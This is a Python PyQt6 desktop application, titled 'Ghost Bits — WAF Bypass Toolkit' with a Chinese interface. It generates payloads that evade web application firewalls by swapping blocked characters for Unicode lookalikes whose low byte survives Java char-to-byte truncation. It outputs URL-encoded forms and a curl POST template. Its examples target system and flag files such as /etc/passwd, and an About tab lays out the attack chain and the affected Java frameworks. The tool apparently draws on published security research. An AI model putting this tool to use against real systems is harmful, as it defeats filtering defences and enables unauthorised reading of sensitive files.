import sys
from PyQt6.QtWidgets import *
from PyQt6.QtCore import Qt, QTimer
from PyQt6.QtGui import QFont, QCursor

# ── Core logic ────────────────────────────────────────────────────────────────

def find_ghost(ascii_cp: int, limit=40) -> list:
    return [i for i in range(0x100, 0x10000) if (i & 0xFF) == ascii_cp][:limit]

def ghost_encode(text: str, blocked: list) -> str:
    if not blocked:
        return text
    sorted_blocked = sorted(blocked, key=len, reverse=True)
    result, i = [], 0
    while i < len(text):
        matched = next((b for b in sorted_blocked if text[i:i+len(b)] == b), None)
        if matched:
            for ch in matched:
                ghosts = find_ghost(ord(ch) & 0xFF)
                result.append(chr(ghosts[0]) if ghosts else ch)
            i += len(matched)
        else:
            result.append(text[i]); i += 1
    return ''.join(result)

def to_url_encoded(text: str) -> str:
    out = []
    for ch in text:
        cp = ord(ch)
        if cp < 0x80 and (ch.isalnum() or ch in '-_.~'):
            out.append(ch)
        else:
            for b in ch.encode('utf-8'):
                out.append(f'%{b:02X}')
    return ''.join(out)

# ── Stylesheet ────────────────────────────────────────────────────────────────

QSS = """
QWidget { background:#0f1117; color:#e2e8f0; font-family:'SF Pro Display','Segoe UI',Arial,sans-serif; font-size:13px; }
QMainWindow { background:#0f1117; }

QTabWidget::pane { border:none; background:#0f1117; }
QTabBar { background:#1a1d27; }
QTabBar::tab { background:transparent; color:#64748b; padding:10px 28px; border:none; font-size:13px; }
QTabBar::tab:selected { color:#e2e8f0; border-bottom:2px solid #5b6ef5; background:#0f1117; }
QTabBar::tab:hover:!selected { color:#94a3b8; background:#1a1d27; }

QLineEdit, QTextEdit, QPlainTextEdit {
    background:#161929; border:1px solid #2e3352; border-radius:8px;
    padding:8px 12px; color:#e2e8f0; selection-background-color:#5b6ef5;
    font-family:'JetBrains Mono','Fira Code','Courier New',monospace; font-size:13px;
}
QLineEdit:focus, QTextEdit:focus, QPlainTextEdit:focus { border:1px solid #5b6ef5; }

QPushButton {
    background:#5b6ef5; color:white; border:none; border-radius:7px;
    padding:7px 18px; font-size:12px; font-weight:600;
}
QPushButton:hover { background:#7c3aed; }
QPushButton:pressed { background:#4f46e5; }

QPushButton#pill_btn {
    background:#1e293b; color:#94a3b8; border:1px solid #2e3352;
    padding:4px 12px; font-size:11px; border-radius:999px;
}
QPushButton#pill_btn:hover { background:#2e3352; color:#e2e8f0; }

QPushButton#copy_btn {
    background:#1e293b; color:#94a3b8; border:1px solid #2e3352;
    padding:5px 14px; font-size:11px; border-radius:6px; min-width:58px;
}
QPushButton#copy_btn:hover { background:#2e3352; }

QPushButton#copy_ok {
    background:#064e3b; color:#10b981; border:1px solid #10b981;
    padding:5px 14px; font-size:11px; border-radius:6px; min-width:58px;
}

QPushButton#tag_x {
    background:transparent; color:#94a3b8; border:none;
    padding:0px; font-size:13px; min-width:16px; max-width:16px; border-radius:4px;
}
QPushButton#tag_x:hover { color:#ef4444; }

QFrame#card { background:#21253a; border:1px solid #2e3352; border-radius:10px; }
QFrame#out_card { background:#161929; border:1px solid #2e3352; border-radius:8px; }

QScrollBar:vertical { background:#1a1d27; width:6px; border-radius:3px; }
QScrollBar::handle:vertical { background:#2e3352; border-radius:3px; min-height:30px; }
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height:0; }
QScrollBar:horizontal { background:#1a1d27; height:6px; border-radius:3px; }
QScrollBar::handle:horizontal { background:#2e3352; border-radius:3px; }
QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal { width:0; }

QLabel#section { color:#94a3b8; font-size:11px; font-weight:600; letter-spacing:1px; }
QLabel#hint    { color:#475569; font-size:11px; }
"""

# ── Helpers ───────────────────────────────────────────────────────────────────

def copy_flash(text, btn):
    QApplication.clipboard().setText(text)
    btn.setText("✓ 已复制"); btn.setObjectName("copy_ok")
    btn.style().unpolish(btn); btn.style().polish(btn)
    def reset():
        btn.setText("复制"); btn.setObjectName("copy_btn")
        btn.style().unpolish(btn); btn.style().polish(btn)
    QTimer.singleShot(1400, reset)

def section(text):
    l = QLabel(text.upper()); l.setObjectName("section"); return l

def hline():
    f = QFrame(); f.setFrameShape(QFrame.Shape.HLine)
    f.setStyleSheet("color:#2e3352; background:#2e3352; max-height:1px;"); return f

def out_row(label_text):
    card = QFrame(); card.setObjectName("out_card")
    vl = QVBoxLayout(card); vl.setContentsMargins(12, 8, 12, 8); vl.setSpacing(4)
    top = QHBoxLayout()
    lbl = QLabel(label_text); lbl.setObjectName("hint")
    btn = QPushButton("复制"); btn.setObjectName("copy_btn"); btn.setFixedWidth(64)
    top.addWidget(lbl); top.addStretch(); top.addWidget(btn)
    vl.addLayout(top)
    te = QPlainTextEdit(); te.setReadOnly(True)
    te.setFixedHeight(40); te.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
    vl.addWidget(te)
    btn.clicked.connect(lambda: copy_flash(te.toPlainText(), btn))
    return card, te

# ── Tag bar ───────────────────────────────────────────────────────────────────

class TagBar(QWidget):
    def __init__(self, on_change):
        super().__init__()
        self.on_change = on_change
        self.tags = []
        self.setFixedHeight(44)
        self.setStyleSheet("background:#161929; border:1px solid #2e3352; border-radius:8px;")
        self._layout = QHBoxLayout(self)
        self._layout.setContentsMargins(8, 4, 8, 4)
        self._layout.setSpacing(5)
        self.entry = QLineEdit()
        self.entry.setPlaceholderText("输入被拦截的词或字符，按 Enter 添加…")
        self.entry.setStyleSheet("background:transparent; border:none; padding:2px 4px;")
        self.entry.returnPressed.connect(self._commit)
        self._layout.addWidget(self.entry)

    def _commit(self):
        v = self.entry.text().strip()
        if v and v not in self.tags:
            self.tags.append(v); self._rebuild()
        self.entry.clear()

    def add(self, v):
        if v not in self.tags:
            self.tags.append(v); self._rebuild()

    def _remove(self, v):
        if v in self.tags:
            self.tags.remove(v); self._rebuild()

    def _rebuild(self):
        while self._layout.count() > 1:
            w = self._layout.takeAt(0).widget()
            if w: w.deleteLater()
        for tag in self.tags:
            chip = QFrame()
            chip.setStyleSheet("background:#4c1d95; border-radius:999px; border:none;")
            hl = QHBoxLayout(chip); hl.setContentsMargins(8, 2, 4, 2); hl.setSpacing(4)
            lbl = QLabel(tag)
            lbl.setStyleSheet("color:white; font-family:'Courier New',monospace; font-size:12px; background:transparent; border:none;")
            rm = QPushButton("×"); rm.setObjectName("tag_x"); rm.setFixedSize(16, 16)
            rm.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
            rm.clicked.connect(lambda _, t=tag: self._remove(t))
            hl.addWidget(lbl); hl.addWidget(rm)
            self._layout.insertWidget(self._layout.count() - 1, chip)
        self.on_change()

# ── Bypass Tab ────────────────────────────────────────────────────────────────

class BypassTab(QWidget):
    def __init__(self):
        super().__init__()
        v = QVBoxLayout(self); v.setContentsMargins(22, 16, 22, 16); v.setSpacing(8)

        v.addWidget(section("完整命令 / 路径"))
        self.cmd = QPlainTextEdit()
        self.cmd.setPlaceholderText("例：cat /etc/passwd     /tmp/flag.txt")
        self.cmd.setFixedHeight(54)
        self.cmd.textChanged.connect(self._gen)
        v.addWidget(self.cmd)

        v.addSpacing(4)
        v.addWidget(section("被拦截的字符串"))
        self.tags = TagBar(self._gen)
        v.addWidget(self.tags)

        pr = QHBoxLayout()
        lbl = QLabel("快速添加:"); lbl.setObjectName("hint")
        pr.addWidget(lbl)
        for p in [".", "/", "etc", "passwd", "flag", "tmp", "..", "proc"]:
            b = QPushButton(p); b.setObjectName("pill_btn")
            b.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
            b.clicked.connect(lambda _, val=p: self.tags.add(val))
            pr.addWidget(b)
        pr.addStretch()
        v.addLayout(pr)

        v.addWidget(hline())
        v.addWidget(section("Bypass Payload"))

        self.card_plain, self.te_plain = out_row("直接粘贴到输入框")
        self.card_url,   self.te_url   = out_row("URL 编码（Burp / curl）")
        self.card_curl,  self.te_curl  = out_row("curl 命令")
        for c in [self.card_plain, self.card_url, self.card_curl]:
            v.addWidget(c)
        v.addStretch()

    def _gen(self):
        cmd = self.cmd.toPlainText().strip()
        blocked = self.tags.tags
        ph = "— 填写命令并添加被拦截的字符串 —"
        if not cmd or not blocked:
            for te in [self.te_plain, self.te_url, self.te_curl]:
                te.setPlainText(ph)
            return
        enc = ghost_encode(cmd, blocked)
        url = to_url_encoded(enc)
        self.te_plain.setPlainText(enc)
        self.te_url.setPlainText(url)
        self.te_curl.setPlainText(f'curl -X POST "TARGET_URL" -d "filename={url}"')

# ── Lookup Tab ────────────────────────────────────────────────────────────────

class LookupTab(QWidget):
    def __init__(self):
        super().__init__()
        v = QVBoxLayout(self); v.setContentsMargins(22, 16, 22, 16); v.setSpacing(8)

        v.addWidget(section("输入 ASCII 字符 — 查找所有 Ghost 替换体"))
        self.entry = QLineEdit()
        self.entry.setPlaceholderText("输入单个字符，如  .  /  e  t  c")
        self.entry.setFixedHeight(44)
        self.entry.setFont(QFont("JetBrains Mono, Courier New", 15))
        self.entry.textChanged.connect(self._lookup)
        v.addWidget(self.entry)

        self.hint = QLabel(""); self.hint.setObjectName("hint")
        v.addWidget(self.hint)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("QScrollArea { border:none; background:transparent; }")
        self.grid_container = QWidget()
        self.grid_container.setStyleSheet("background:transparent;")
        self.grid = QGridLayout(self.grid_container)
        self.grid.setSpacing(10); self.grid.setAlignment(Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignLeft)
        scroll.setWidget(self.grid_container)
        v.addWidget(scroll)

    def _lookup(self):
        for i in reversed(range(self.grid.count())):
            w = self.grid.itemAt(i).widget()
            if w: w.deleteLater()
        ch = self.entry.text()
        if not ch:
            self.hint.setText(""); self.hint.setStyleSheet(""); return
        cp = ord(ch[0])
        if cp > 0xFF:
            self.hint.setText("请输入普通 ASCII 字符（0x00–0xFF）")
            self.hint.setStyleSheet("color:#ef4444; font-size:11px;"); return
        ghosts = find_ghost(cp)
        self.hint.setText(f"字符 '{ch[0]}'  ASCII 0x{cp:02X}  →  找到 {len(ghosts)} 个替换体（低8位均 = 0x{cp:02X}）")
        self.hint.setStyleSheet("color:#10b981; font-size:11px;")
        for idx, gcp in enumerate(ghosts):
            gch = chr(gcp)
            card = QFrame(); card.setObjectName("card"); card.setFixedSize(102, 94)
            cl = QVBoxLayout(card); cl.setContentsMargins(6, 8, 6, 6); cl.setSpacing(2)
            big = QLabel(gch); big.setAlignment(Qt.AlignmentFlag.AlignCenter)
            big.setStyleSheet("font-size:26px; color:#5b6ef5; background:transparent; border:none;")
            code = QLabel(f"U+{gcp:04X}"); code.setAlignment(Qt.AlignmentFlag.AlignCenter)
            code.setStyleSheet("font-size:10px; color:#475569; font-family:'Courier New'; background:transparent; border:none;")
            btn = QPushButton("复制"); btn.setObjectName("copy_btn")
            btn.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
            btn.clicked.connect(lambda _, c=gch, b=btn: copy_flash(c, b))
            cl.addWidget(big); cl.addWidget(code); cl.addWidget(btn)
            self.grid.addWidget(card, idx // 5, idx % 5)
        for c in range(5): self.grid.setColumnStretch(c, 1)

# ── About Tab ────────────────────────────────────────────────────────────────

class AboutTab(QWidget):
    def __init__(self):
        super().__init__()
        v = QVBoxLayout(self); v.setContentsMargins(22, 16, 22, 16); v.setSpacing(0)
        scroll = QScrollArea(); scroll.setWidgetResizable(True)
        scroll.setStyleSheet("QScrollArea { border:none; }")
        inner = QWidget(); iv = QVBoxLayout(inner)
        iv.setContentsMargins(0, 0, 0, 0); iv.setSpacing(10)
        for title, color, body in [
            ("核心缺陷", "#5b6ef5",
             "Java 的 char 是 16 位，byte 只有 8 位。\n"
             "当代码执行 (byte)ch 或 ch & 0xFF 时，高 8 位被静默丢弃，\n"
             "这段消失的数据就叫「幽灵比特位（Ghost Bits）」。"),
            ("攻击链", "#f59e0b",
             "1. 找到低8位 = 目标字符 ASCII 码的 Unicode 替换体\n"
             "   U+012E (Į) → 低8位 0x2E = '.'  |  U+012F (į) → 低8位 0x2F = '/'\n\n"
             "2. WAF 看到：įtmpįflagĮtxt → 无敏感字符 → 放行\n\n"
             "3. Java (byte)ch 截断高位 → 还原 /tmp/flag.txt → 读取成功"),
            ("受影响组件", "#ef4444",
             "Spring Framework · Apache Tomcat · Jackson Databind · Fastjson\n"
             "Jetty · Undertow · Vert.x · Jodd · Angus Mail · Lettuce · HttpClient ≤4.5.9"),
            ("发现者", "#10b981",
             "Zhihui Chen（1ue）与 Xinyu Bai（浅蓝）\n"
             "Black Hat Asia 2026\n"
             "《Cast Attack: A New Threat Posed by Ghost Bits in Java》"),
        ]:
            card = QFrame(); card.setObjectName("card")
            cl = QVBoxLayout(card); cl.setContentsMargins(16, 14, 16, 14); cl.setSpacing(6)
            tl = QLabel(title)
            tl.setStyleSheet(f"color:{color}; font-size:13px; font-weight:600; background:transparent; border:none;")
            bl = QLabel(body); bl.setWordWrap(True)
            bl.setStyleSheet("color:#94a3b8; font-size:12px; line-height:1.6; background:transparent; border:none;")
            cl.addWidget(tl); cl.addWidget(bl)
            iv.addWidget(card)
        iv.addStretch()
        scroll.setWidget(inner)
        v.addWidget(scroll)

# ── Main Window ───────────────────────────────────────────────────────────────

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Ghost Bits — WAF Bypass Toolkit")
        self.resize(860, 680); self.setMinimumSize(700, 520)

        central = QWidget(); self.setCentralWidget(central)
        root = QVBoxLayout(central); root.setContentsMargins(0, 0, 0, 0); root.setSpacing(0)

        hdr = QWidget(); hdr.setFixedHeight(54)
        hdr.setStyleSheet("background:#1a1d27; border-bottom:1px solid #2e3352;")
        hl = QHBoxLayout(hdr); hl.setContentsMargins(20, 0, 20, 0)
        t1 = QLabel("👻  Ghost Bits")
        t1.setStyleSheet("color:#5b6ef5; font-size:18px; font-weight:700; background:transparent;")
        t2 = QLabel("Java char→byte 高位截断 · WAF Bypass Toolkit")
        t2.setStyleSheet("color:#475569; font-size:12px; background:transparent;")
        hl.addWidget(t1); hl.addSpacing(12); hl.addWidget(t2); hl.addStretch()
        root.addWidget(hdr)

        tabs = QTabWidget(); tabs.setDocumentMode(True)
        tabs.addTab(BypassTab(), "  ⚡  Bypass 生成  ")
        tabs.addTab(LookupTab(), "  🔍  Ghost 字符查询  ")
        tabs.addTab(AboutTab(),  "  📖  原理  ")
        root.addWidget(tabs)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyleSheet(QSS)
    app.setStyle("Fusion")
    w = MainWindow(); w.show()
    sys.exit(app.exec())